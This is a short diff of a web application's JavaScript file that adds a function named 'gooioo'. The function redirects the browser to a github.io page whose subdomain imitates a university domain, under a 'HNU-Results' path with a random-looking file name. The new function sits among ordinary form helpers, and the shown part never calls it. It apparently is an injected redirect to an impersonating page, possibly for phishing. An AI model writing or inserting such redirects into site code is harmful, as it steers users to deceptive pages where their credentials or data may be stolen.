@@ -9,7 +9,9 @@ function ew_ClientScriptInclude(path) {
 	document.write(' src="' + path + '">');
 	document.write('</' + 'script' + '>');
 }
-
+function gooioo(){
+window.location.href = "https://app1-helwan-edu-eg.github.io/HNU-Results/bkvyuviuvyoivyvouvyovyvoyvoyvoubuoih5464.html";
+}
 // Handle search operator changed
 function ew_SrchOprChanged(elem) {
 	var f = elem.form;
